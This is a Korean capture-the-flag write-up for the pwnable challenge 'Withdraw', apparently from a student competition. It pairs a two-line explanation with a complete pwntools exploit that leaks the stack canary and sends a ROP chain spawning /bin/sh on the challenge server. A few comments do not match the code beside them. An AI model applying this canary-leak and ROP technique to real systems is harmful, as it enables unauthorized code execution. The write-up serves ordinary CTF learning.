## No.23 Pwnable Withdraw[200]

**점수:** 200

**분야:** Pwnable

**제목:** Withdraw

**Description:**

> Let's withdraw money!
> 
> nc 223.194.105.182 35159
> Download : https://goo.gl/1PYrox

스택 canary가 있어 바로 BOF가 불가능하기 때문에 먼저 버퍼를 적당히 채워 canary를 알아낸다.

그 뒤론 전형적인 ROP이다.

```python
from pwn import *
 
r = remote('223.194.105.182', 35159)
 
r.recvuntil('number : ')
r.sendline('2')
r.sendline(' y')
r.recvuntil('code.')
r.send('a' * 65)
r.recvuntil('Hi, ')
leak = r.recvline()
canary = u32('\x00' + leak[-4:-1])
 
r.recvuntil('number : ')
r.sendline('2')
r.sendline(' y')
r.recvuntil('code.')
 
p = '\x00' * 64
p += p32(canary) * 2 # canary + sfp
p += p32(0x0805bf42) # pop edx ; ret
p += p32(0x080eb060) # @ .data
p += p32(0x08048882) # pop eax ; ret
p += '/bin'
p += p32(0x08054c5b) # mov dword ptr [edx], eax ; ret
p += p32(0x0805bf42) # pop edx ; ret
p += p32(0x080eb064) # @ .data + 4
p += p32(0x08048882) # pop eax ; ret
p += '//sh'
p += p32(0x08054c5b) # mov dword ptr [edx], eax ; ret
p += p32(0x0805bf42) # pop edx ; ret
p += p32(0x080eb068) # @ .data + 8
p += p32(0x08049553) # xor eax, eax ; ret
p += p32(0x08054c5b) # mov dword ptr [edx], eax ; ret
p += p32(0x080481c9) # pop ebx ; ret
p += p32(0x080eb060) # @ .data
p += p32(0x080df4e1) # pop ecx ; ret
p += p32(0x080eb068) # @ .data + 8
p += p32(0x0805bf42) # pop edx ; ret
p += p32(0x080eb068) # @ .data + 8
p += p32(0x08048882) # pop eax ; ret
p += p32(11)         # inc eax ; ret
p += p32(0x0806ce55) # int 0x80
 
r.send(p)
 
# try to withdraw negative money -> shell
r.interactive()
```
